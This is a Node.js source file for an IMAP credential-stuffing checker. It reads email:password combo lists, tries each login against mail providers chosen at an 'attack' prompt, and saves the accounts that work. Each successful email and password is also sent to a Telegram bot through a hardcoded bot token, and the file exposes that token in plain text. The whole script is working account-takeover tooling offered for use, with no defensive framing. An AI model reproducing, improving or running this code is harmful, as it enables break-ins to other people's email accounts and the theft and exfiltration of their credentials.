process.env["NTBA_FIX_319"] = 1; // telegram bot warning fix

// dependencies
const imaps = require('imap-simple');
const fs = require('fs');
const cliProgress = require('cli-progress');
const TelegramBot = require('node-telegram-bot-api');
var configs = require('./imaps.json');
const stream = fs.createWriteStream("results.txt");
const progressBar = new cliProgress.SingleBar({forceRedraw: true}, cliProgress.Presets.shades_classic);
var inquirer = require('inquirer');

// telegram bot username @ChichkeBot
const botToken = '1015158198:AAE8d8TzPix7J5vPa9jr0wAsiJjdjocZiOY';
const bot = new TelegramBot(botToken, { polling: true });

// global vars
var host;
var port;
var tls;
var max = 0;
var counter = 0;
var found = 0;
var id;
var log = 'Nothing!'

setupBot = () => {

    bot.onText(/\/status/, (msg, match) => {
        // 'msg' is the received Message from Telegram
        // 'match' is the result of executing the regexp above on the text content
        // of the message
        id = msg.chat.id;
        // send back the matched "whatever" to the chat
        bot.sendMessage(id, 'Current progress is ' + counter + ' / ' + max);
        bot.sendMessage(id, 'Found ' + found + ' working combo...');
    });

    bot.onText(/\/log/, (msg, match) => {
        // 'msg' is the received Message from Telegram
        // 'match' is the result of executing the regexp above on the text content
        // of the message
        id = msg.chat.id;
        // send back the matched "whatever" to the chat
        bot.sendMessage(id, log);
    });
}

clear = () => {
    process.stdout.write('\033c')
};

connect = async (username, password) => {
    var config = {
        imap: {
            user: username,
            password: password,
            host: host,
            port: port,
            tls: tls,
            authTimeout: 5000
        }
    };

    //console.log(username)
    //console.log(host);
    counter++

    await imaps.connect(config)
        .then(function (connection) {
            found++;
            const successMsg = '~~ ACCOUNT FOUND ~~ MAIL: ' + username + ' ~~ PASS: ' + password + '~~\n'
            writeResult(successMsg);
            console.log(successMsg)
            bot.sendMessage(id, successMsg)
                .catch(err => log = error);
        }).catch(error => {
            log = error.toString();
        });
}

parser = (line, selection) => {
    for (let i = 0; i < selection.length; i++)
        for (id in configs[selection[i]].tag)
            if (line.includes(configs[selection[i]].tag[id])) {
                port = configs[selection[i]].port;
                host = configs[selection[i]].host;
                tls = configs[selection[i]].tls;
                return;
            }
    port = -1;
}

writeResult = (result) => {
    stream.once('open', function (fd) {
        stream.write(result);
        stream.end();
    });
}

main = async (selection) => {
    var array = fs.readFileSync('./combo.txt').toString().split("\r\n");
    for (line in array)
        for (let i = 0; i < selection.length; i++)
            for (id in configs[selection[i]].tag)
                if (array[line].includes(configs[selection[i]].tag[id]))
                    max++;
    clear();
    progressBar.start(max, counter);
    for (line in array) {
        progressBar.update(counter);
        parser(array[line], selection);
        if (port !== -1)
            await connect(array[line].slice(0, array[line].indexOf(':')), array[line].slice(array[line].indexOf(':') + 1, array[line].length));
    }
}

clear();

var arrayConfigs = [];
for (conf in configs)
    arrayConfigs.push(conf);

var prompt = inquirer.createPromptModule();


showPrompt = () => {
    prompt({ type: 'checkbox', name: 'selection', message: 'Select host to Attack', choices: arrayConfigs, pageSize: 6 })
        .then(array => {
            if (array.selection.length) {
                setupBot();
                main(array.selection);
            } else {
                clear();
                showPrompt()
            }
        }).catch(err => { console.log(err) });
}

showPrompt();